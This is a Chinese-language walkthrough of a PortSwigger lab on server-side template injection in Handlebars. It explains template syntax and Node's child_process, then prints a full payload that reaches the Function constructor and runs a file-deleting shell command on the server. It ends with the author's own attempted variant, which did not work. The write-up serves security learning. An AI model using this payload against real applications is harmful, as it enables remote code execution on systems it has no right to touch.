[靶场地址,点击前往](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)  
依旧py编码: **Burp_py\URL编码\url_encode.py**
---

### 新知识
1. {{ 表达式 }}: 取值并输出  
- ```
  </> handlebars  
  你好,{{user.name}}!
  ```
- 你好,weter!
2. #with /with: 临时切换当前对象
- 
```
{{#with user}}　　　　　　->开始标签  
  姓名: {{name}}  
  学号: {{id}}  
{{/with}}　　　　　　　　　->结束标签
```
- 姓名: weter  
  学号: 100
1. as |别名|: 给当前对象起明确别名
- 
```
{{#whth user as |person|}}  
  姓名:{{person.name}}  
  学号:{{person.id}}  
{{/with}}
```
2. #each: 遍历列表
- ```
  < ul>  
  {{#each fruits}}  
    < li>{{this}}< /li>  
  {{/each}}  
  < /ul>
  ```  
    - fruits是列表名
    - this 是当前上下文对象
    - ~~< ul>是为了防止.md文档转义,正常没有前面的空格~~  
   - 结果:  
  < ul>  
  　< li>apple< /li>  
  　< li>banan< /li>  
  　< li>orange< /li>  
  < /ul>
3. push: 列表添加函数()
   - 列表.push(元素)　　实际添加(元素,option)
   - 列表.push(元素,元素)　　实际添加(元素,元素,option)
   - option: 本次操作的元数据,不是业务数据,是 *Handlebars*运行时的特定产物
4. require(): 加载 Node.js模块
   - const path = require("path");  
     console.log(path.basename("/docs/readme.txt"));
       - JS的语法: *import path from "path";* 
   - 输出: readme.txt  
   - ~~require是*CommendJS*模块加载;import是*ESM*模块语法;exec()异步启动命令字符串,标准输出通常在*stdout*中,不直接返回~~
5. child_process 与执行函数
   - const { exec } = require("child_process");  
     exec("echo hello",(error,stdout,stderr) => {  
     　　console.log(stdout);  
     });  
       - { exec }: 只从 *子进程* 模块导出 *exec*
       - console.log: 把标准输出打印到程序控制台
---

### 进入靶场
1. 交上去一堆奇奇怪怪的东西 *${{<%[%'"}}%* 无所谓报错就行  
从报错信息里面发现这是*handlebars*编译的  -> 图1
2. 来详细解释一下本题命令：
```js
</>js
test123{{#with "s" as |string|}}
      {{#with "e"}}
        {{#with split as |conslist|}}
          {{this.pop}}
          {{this.push (lookup string.sub "constructor")}}
          {{this.pop}}
          {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
            {{this.pop}}
            {{#each conslist}}
              {{#with (string.sub.apply 0 codelist)}}
                {{this}}
              {{/with}}
            {{/each}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
```
**下面,我将使用py进行类比讲解**
  - string = "s"
  - conslist = "e".split() = ["e"]
  - conslist.pop() 把"e"丢了
  - conslist.extend([元素,option])
  - conslist.pop() 把option扔了,随后 ["s"]同理
  - 现在,两个列表分别是 *导入constructor* 和*子进程 rm*
  - each遍历列表,执行命令
  - 闭合所有标签
3. url编码,send   -> 图2
**solved**
---
## 忽然想自己构造一个:但是没有成功
```js
{{#with "e".split as |s|}}
  {{this.pop}}
  {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
  {{this.pop}}
  {{this.push (lookup s.sub "constructor")}}
  {{this.pop}}
  {{#each s}}
    {{this}}
  {{/each}}
{{/with}}
```